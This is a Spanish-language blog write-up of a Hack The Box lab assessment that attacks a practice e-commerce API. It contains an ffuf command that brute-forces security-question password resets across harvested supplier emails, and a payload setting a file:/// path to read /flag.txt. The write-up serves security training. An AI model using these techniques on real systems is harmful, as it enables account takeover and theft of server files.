@@ -1,0 +1,455 @@
+---
+layout: post
+
+title: API Attack - HTB Skills Assessment
+excerpt: 'Write-up técnico del HTB Skills Assessment “API Attack”: enumeración de endpoints, abuso de autenticación/autorización y encadenado de fallos típicos en APIs hasta obtener impacto verificable y evidencias reproducibles.'
+
+category: writeups
+category_label: "Writeups"
+primary_category_anchor: writeups
+categories:
+  - writeups
+kicker: "writeups"
+
+post_title: "WriteUp API Attack - HTB Skills Assessment"
+description: "Writeup del Skills Assessment de APIs de HTB con encadenado de fallos de autenticación, autorización y lectura de ficheros."
+
+image: /assets/images/guias/API_Attack_HTB_Skills_Assessment.png
+
+slug: api-attack-htb-skills-assessment
+permalink: /blog/writeups/api-attack-htb-skills-assessment.html
+
+nav: blog
+
+featured: false
+featured_badge: "Writeup"
+featured_lines:  
+  - "GET /api/v2/suppliers/all"
+  - "POST /api/v2/authentication/"
+  - "ffuf -w emails.txt:EMAIL"
+
+cover_badge: "WriteUps"
+cover_lines:
+  - "GET /api/v2/suppliers/all"
+  - "POST /api/v2/authentication/"
+  - "ffuf -w emails.txt:EMAIL"
+cover_image: /assets/img/blog/API-Attack-HTB-Skills-Assessment/cover.png
+
+reading_time: "4 min de lectura"
+date: 2026-01-26 10:00:00 +0100
+
+kicker_secondary: "Seguridad ofensiva"
+
+tags:
+- api security
+- htb
+- ssrf
+- broken authentication
+
+toc_html: |
+  <a href="#paso-1-iniciando-sesion-y-compromando-usuario-y-roles">Paso 1: Iniciando sesion y compromando usuario y roles</a>
+  <a href="#paso-2-identificando-broken-object-property-level-authorization">Paso 2: Identificando Broken Object Property Level Authorization</a>
+  <a href="#conclusion">Conclusion</a>
+
+---
+
+<h2 id="escenario">Escenario</h2>
+<p>Tras reportar todas las vulnerabilidades en las versiones v0 y v1 del Marketplace de E-Commerce de Inlanefreight, el administrador intentó parchearlas todas en la v2.</p>
+<p>Sin embargo, nuevos desarrolladores junior han implementado funcionalidades adicionales en la v2, y el administrador está preocupado de que puedan haber introducido nuevas vulnerabilidades. Evalúa la seguridad de la nueva versión de la API web y aplica todo lo aprendido a lo largo del módulo para comprometerla.</p>
+<h2 id="objetivo">Objetivo</h2>
+<p>Envia el contenido de la flag en '/flag.txt'</p>
+<h2 id="datos">Datos</h2>
+<p><strong>Cuenta</strong> : htbpentester@hackthebox.com:HTBPentester</p>
+<p><strong>API doc</strong> : /swagger</p>
+<h2 id="paso-1-iniciando-sesion-y-compromando-usuario-y-roles">Paso 1: Iniciando sesion y compromando usuario y roles</h2>
+<p>Primero, inicié sesión usando las credenciales de la cuenta proporcionadas y comprobé la información y los roles del usuario.</p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-1.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-2.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-3.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-4.png"/></p>
+<p>Una vez dentro, comprobe los datos de usuario</p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-7.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-8.png"/></p>
+
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">json</div>
+  </div>
+  <div class="code-window__body">
+<pre><code>{
+  "customer": {
+    "id": "3d6b5aba-302b-4c50-a90a-088307d0b637",
+    "name": "HTBPentester",
+    "email": "htbpentester@hackthebox.com",
+    "phoneNumber": "+44 9999 999999",
+    "birthDate": "1997-06-21"
+  }
+}
+  </code>
+</pre>
+    </div>
+  </div>
+
+<p>Vi que tenía asignados dos roles:</p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-5.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-6.png"/></p>
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">petición.txt</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>
+{
+  "roles": [
+    "Suppliers_Get",
+    "Suppliers_GetAll"
+  ]
+}
+</code></pre>
+    </div>
+  </div>
+
+<h2 id="paso-2-identificando-broken-object-property-level-authorization">Paso 2: Identificando Broken Object Property Level Authorization</h2>
+<p>Al consultar el endpoint <code>GET /api/v2/suppliers/all</code>, descubrí una vulnerabilidad de <strong>Broken Object Property Level Authorization (BOPLA)</strong>, concretamente <strong>Excessive Data Exposure</strong>.</p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-9.png"/></p>
+<p>Esta vulnerabilidad podría provocar:</p>
+<ul>
+<li><strong>Pérdidas financieras</strong> si los clientes contactan directamente con los proveedores, eludiendo la plataforma de Inlanefreight.</li>
+<li></li>
+<li><strong>Bypass de autenticación y toma de control de cuentas</strong> al realizar fuerza bruta sobre la pregunta de seguridad asociada a las cuentas de usuario.</li>
+</ul>
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">petición.txt</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>
+{
+  "suppliers": [
+    {
+      "id": "00ac3d74-6c7d-4ef0-bf15-00851bf353ba",
+      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
+      "name": "James Allen",
+      "email": "J.Allen1607@globalsolutions.com",
+      "securityQuestion": "SupplierDidNotProvideYet",
+      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
+    },
+
+    ...
+
+    {
+      "id": "eac0c347-12e0-4435-b902-c7e22e3c9dd5",
+      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
+      "name": "Patrick Howard",
+      "email": "P.Howard1536@globalsolutions.com",
+      "securityQuestion": "What is your favorite color?",
+      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
+    },
+    {
+      "id": "b87017cd-c720-43a3-acbe-46bfbfd6e4aa",
+      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
+      "name": "Luca Walker",
+      "email": "L.Walker1872@globalsolutions.com",
+      "securityQuestion": "What is your favorite color?",
+      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
+    },
+    {
+      "id": "fafebea0-8894-4744-b7de-6c66d5749740",
+      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
+      "name": "Tucker Harris",
+      "email": "T.Harris1814@globalsolutions.com",
+      "securityQuestion": "What is your favorite color?",
+      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
+    },
+    {
+      "id": "36f17195-395f-443e-93a4-8ceee81c6106",
+      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
+      "name": "Brandon Rogers",
+      "email": "B.Rogers1535@globalsolutions.com",
+      "securityQuestion": "What is your favorite color?",
+      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
+    },
+    {
+      "id": "73ff2040-8d86-4932-bd3f-6441d648dcca",
+      "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
+      "name": "Mason Alexander",
+      "email": "M.Alexander1650@globalsolutions.com",
+      "securityQuestion": "What is your favorite color?",
+      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
+    },
+
+    ...
+   
+    {
+      "id": "b348f695-7f24-4707-a1d9-79ea4d4d2d5a",
+      "companyID": "354d9cf9-4df4-49c3-bc4a-e714e7016759",
+      "name": "Riley Henderson",
+      "email": "R.Henderson1800@futuristicfurniture.com",
+      "securityQuestion": "SupplierDidNotProvideYet",
+      "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
+    }
+  ]
+}
+</code></pre>
+    </div>
+  </div>
+
+<p>Después, me desplacé por la respuesta y observé que algunas cuentas tenían la pregunta de seguridad: “¿Cuál es tu color favorito?”, que es fácil de adivinar.</p>
+<p>Además, encontré un endpoint de la API para restablecer contraseñas usando respuestas a preguntas de seguridad: <code>POST /api/v2/authentication/suppliers/passwords/resets/security-question-answers</code>.</p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-10.png"/></p>
+<h3>Fuerza Bruta</h3>
+<p>Para explotar esto, busqué en Internet “color wordlist” y tomé la primera que encontré.</p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-16.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-17.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-40.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-19.png"/></p>
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">petición.txt</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>
+$ cat colors.txt | wc -l
+75
+</code></pre>
+    </div>
+  </div>
+
+<p>También extraje los 5 correos electrónicos de las cuentas con preguntas de seguridad y los guardé en emails.txt.</p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-14.png"/></p>
+<p>Después, utilicé ffuf para realizar fuerza bruta contra todas las cuentas, ya que comparten la misma pregunta de seguridad, tras probar primero algún valor aleatorio para obtener el mensaje de error y poder filtrarlo (false).</p>
+        
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">bash</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>
+      $ ffuf -w emails.txt:EMAIL -w colors.txt:COLOR -u http://94.237.50.128:55283/api/v2/authentication/suppliers/passwords/resets/security-question-answers -X POST -H 'Content-Type: application/json' -d '{"SupplierEmail": "EMAIL", "SecurityQuestionAnswer": "COLOR", "NewPassword": "123456"}' -fr "false"
+</code></pre>
+    </div>
+  </div>
+
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">petición.txt</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : POST
+ :: URL              : http://94.237.50.128:55283/api/v2/authentication/suppliers/passwords/resets/security-question-answers
+ :: Wordlist         : EMAIL: /home/htb-ac-1333791/emails.txt
+ :: Wordlist         : COLOR: /home/htb-ac-1333791/colors.txt
+ :: Header           : Content-Type: application/json
+ :: Data             : {"SupplierEmail": "EMAIL", "SecurityQuestionAnswer": "COLOR", "NewPassword": "123456"}
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Regexp: false
+________________________________________________
+
+[Status: 200, Size: 22, Words: 1, Lines: 1, Duration: 6ms]
+    * COLOR: &lt;REDACTED&gt;
+    * EMAIL: B.Rogers1535@globalsolutions.com
+
+:: Progress: [375/375] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
+
+</code></pre>
+    </div>
+  </div>
+
+<p>Incié sesión con la cuenta comprometida.</p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-21.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-22.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-23.png"/></p>
+<p>Comprobé que no tenía roles asignados:</p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-24.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-25.png"/></p>
+<p>En este punto, tenía dos opciones:</p>
+<ul>
+<li>Probar todos los endpoints para encontrar una vulnerabilidad de autorización rota.</li>
+<li>Identificar qué acciones podían realizarse sin roles.</li>
+</ul>
+<p>Elegí el segundo enfoque.</p>
+<h3>Ataque Server-Side Request Forgery (SSRF)</h3>
+<p>Detecté un campo al consultar la información del usuario actual:</p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-26.png"/></p>
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">petición.txt</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>
+{
+  "supplier": {
+    "id": "36f17195-395f-443e-93a4-8ceee81c6106",
+    "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
+    "name": "Brandon Rogers",
+    "email": "B.Rogers1535@globalsolutions.com",
+    "securityQuestion": "What is your favorite color?",
+    "professionalCVPDFFileURI": "SupplierDidNotUploadYet"
+  }
+}
+</code></pre>
+    </div>
+  </div>
+
+<p>Observé un campo en la respuesta JSON de mi cuenta comprometida: <strong>professionalCVPDFFileURI</strong>.</p>
+<p>Y dos endpoints relevantes que permiten subir un archivo y leer el contenido del archivo en Base64.</p>
+<ul>
+<li>GET /api/v2/suppliers/current-user/cv</li>
+<li>POST /api/v2/suppliers/current-user/cv</li>
+</ul>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-27.png"/></p>
+<p>Primero, intenté subir un archivo que no era PDF, pero el servidor validó correctamente la extensión del archivo:</p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-28.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-29.png"/></p>
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">petición.txt</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>
+{
+  "errorMessage": "Could not upload the CV, its either malicious or very big in size"
+}
+</code></pre>
+    </div>
+  </div>
+
+<p>Después, subí un archivo PDF, que fue aceptado correctamente:</p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-30.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-31.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-32.png"/></p>
+<p>Mientras revisaba otros endpoints de la API, encontré una función de actualización que permitía modificar los datos del usuario, incluida la ruta del archivo:</p>
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">petición.txt</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>
+PUT /api/v2/suppliers/current-user
+</code></pre>
+    </div>
+  </div>
+
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-33.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-34.png"/></p>
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">petición.txt</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>
+{
+  "supplier": {
+    "id": "36f17195-395f-443e-93a4-8ceee81c6106",
+    "companyID": "f9e58492-b594-4d82-a4de-16e4f230fce1",
+    "name": "Brandon Rogers",
+    "email": "B.Rogers1535@globalsolutions.com",
+    "securityQuestion": "What is your favorite color?",
+    "professionalCVPDFFileURI": "file:///app/wwwroot/SupplierCVs/mypdf.pdf"
+  }
+}
+</code></pre>
+    </div>
+  </div>
+
+<p>Preparé el siguiente payload JSON para cambiar la ruta del archivo y hacer que apunte a /flag.txt, y para comprobar si podía actualizar también datos sensibles (y pude):</p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-35.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-36.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-37.png"/></p>
+<p>Tras actualizar la información del usuario, utilicé el endpoint GET para recuperar el contenido del archivo (que estaba codificado en Base64):</p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-38.png"/></p>
+<p><img alt="alt text" src="/assets/img/blog/API-Attack-HTB-Skills-Assessment/image-39.png"/></p>
+<p>Finalmente, decodifiqué la respuesta de la API y obtuve la flag:</p>
+            
+<div class="code-window mt-4 mb-4">
+  <div class="code-window__topbar">
+    <div class="code-window__dots">
+      <span class="dot dot--red"></span>
+      <span class="dot dot--yellow"></span>
+      <span class="dot dot--green"></span>
+    </div>
+    <div class="code-window__title">bash</div>
+  </div>
+  <div class="code-window__body">
+    <pre><code>echo "SFRCe2YxOTBiODBjZDU0M2E4NGIyMz .... " | base64 --decode</code></pre>
+    </div>
+  </div>
+
+<h2 id="conclusion">Conclusion</h2>
+<p>Esta evaluación de seguridad reveló vulnerabilidades críticas en la API del Marketplace de E-Commerce de Inlanefreight:</p>
+<ul>
+<li><p><strong>Excessive Data Exposure (OWASP API #3–2023)</strong>: permitió acceder a información sensible de proveedores.</p>
+</li>
+<li><p><strong>Security Question Weakness (OWASP API #2–2023 — Broken Authentication)</strong>: permitió a un atacante restablecer contraseñas y tomar control de cuentas.</p>
+</li>
+<li><p><strong>Server-Side Request Forgery (SSRF) (OWASP API #7–2023)</strong>: se explotó para acceder a archivos internos del sistema.</p>
+</li>
+</ul>
+<p>Estos problemas ponen de manifiesto la importancia de <strong>implementar controles de acceso robustos</strong>, <strong>mecanismos de autenticación seguros</strong> y una <strong>validación estricta de rutas de archivo</strong>. Las organizaciones deben <strong>aplicar el principio de mínimo privilegio</strong>, <strong>usar autenticación multifactor</strong> y <strong>validar todas las entradas del usuario</strong> para mitigar estos riesgos. Un testing de seguridad adecuado y revisiones de código rigurosas son esenciales para evitar estas vulnerabilidades en versiones futuras.</p>
